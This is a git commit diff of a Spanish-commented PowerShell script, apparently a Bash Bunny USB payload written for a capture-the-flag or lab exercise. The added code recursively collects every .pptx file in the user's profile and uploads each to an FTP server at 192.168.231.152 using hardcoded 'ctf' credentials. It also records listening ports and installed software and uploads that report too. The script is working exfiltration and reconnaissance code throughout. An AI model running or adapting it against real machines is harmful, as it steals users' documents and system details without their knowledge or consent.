31526d2c54c51c91296da7d130b4b160b4deaa52
Ramon <ramon@ramon>
2024-01-19 07:36:29 -0500

    prueba2

--- prueba.ps1
+++ prueba.ps1
@@ -1,16 +1,41 @@
-# Script de PowerShell para revisar puertos abiertos y aplicaciones instaladas
+# Parámetros FTP
+$ftpServer = "192.168.231.152"
+$ftpUsername = "ctf"
+$ftpPassword = "ctf"
 
-# Obtener la ruta del directorio actual del Bash Bunny
-$ruta =""
-$volList = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.VolumeName -eq "BashBunny" }
-if ($volList) {
-    $ruta = $volList.DeviceID
-    Write-Output "La ruta del volumen 'BashBunny' es: $ruta"
+
+
+# Ruta del perfil actual del usuario
+$perfilUsuario = [System.IO.Path]::Combine($env:USERPROFILE)
+
+# Patrón de búsqueda para archivos .ppt
+$patronBusqueda = "*.pptx"
+
+# Buscar archivos en la ruta del perfil del usuario con la extensión .ppt
+$archivosPPT = Get-ChildItem -Path $perfilUsuario -Filter $patronBusqueda -Recurse
+
+# Mostrar la lista de archivos encontrados
+if ($archivosPPT.Count -gt 0) {
+    Write-Host "Archivos .ppt encontrados en $perfilUsuario"
+    foreach ($archivo in $archivosPPT) {
+        Write-Host $archivo.FullName
+	$archivoRemoto = "/" + $archivo.Name
+	$ftp = [System.Net.WebRequest]::Create("ftp://$ftpServer$archivoRemoto")
+	$ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
+	$ftp.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)
+	$contenidoArchivo = Get-Content -Path $archivo.FullName -Raw
+	$bytesArchivo = [System.Text.Encoding]::UTF8.GetBytes($contenidoArchivo)
+
+	$stream = $ftp.GetRequestStream()
+	$stream.Write($bytesArchivo, 0, $bytesArchivo.Length)
+	$stream.Close()
+	
+    }
+} else {
+    Write-Host "No se encontraron archivos .ppt en $perfilUsuario."
 }
-$bashBunnyDir = (Get-Item -Path ".\").FullName
 
-# Crear un directorio para almacenar los resultados en el Bash Bunny
-$resultsDir ="C:\Users\Admin\Desktop\"
+$resultsDir =$perfilUsuario+"\Desktop\"
 New-Item -ItemType Directory -Force -Path $resultsDir | Out-Null
 
 # Obtener la lista de puertos abiertos
@@ -21,27 +46,15 @@ Get-NetTCPConnection | Where-Object { $_.State -eq "Listen" } >> $resultsDir\pru
 Write-Output "`n=== Aplicaciones instaladas ===" >> $resultsDir\prueba.txt
 Get-WmiObject -Class Win32_Product | Select-Object -Property Name, Version >> $resultsDir\prueba.txt
 
-# Indicar que el script ha finalizado
-
-
-# Parámetros FTP
-$ftpServer = "192.168.231.152"
-$ftpUsername = "ctf"
-$ftpPassword = "ctf"
-
-# Ruta local del archivo a enviar
-$archivoLocal = "C:\Users\Admin\Desktop\prueba.txt"
-
-# Ruta remota en el servidor FTP
-$archivoRemoto = "/Archivo.txt"
-
-# Tiempo de espera en segundos (por ejemplo, 1 hora = 3600 segundos)
 $tiempoEspera = 2
 
 # Esperar el tiempo especificado
 Start-Sleep -Seconds $tiempoEspera
 
-# Crear objeto FTP
+# Ruta local del archivo a enviar
+$archivoLocal = $perfilUsuario+"\Desktop\prueba.txt"
+$archivoRemoto = "/scan.txt"
+
 $ftp = [System.Net.WebRequest]::Create("ftp://$ftpServer$archivoRemoto")
 $ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
 $ftp.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)
@@ -56,4 +69,6 @@ $bytesArchivo = [System.Text.Encoding]::UTF8.GetBytes($contenidoArchivo)
 $stream = $ftp.GetRequestStream()
 $stream.Write($bytesArchivo, 0, $bytesArchivo.Length)
 $stream.Close()
+
+
 
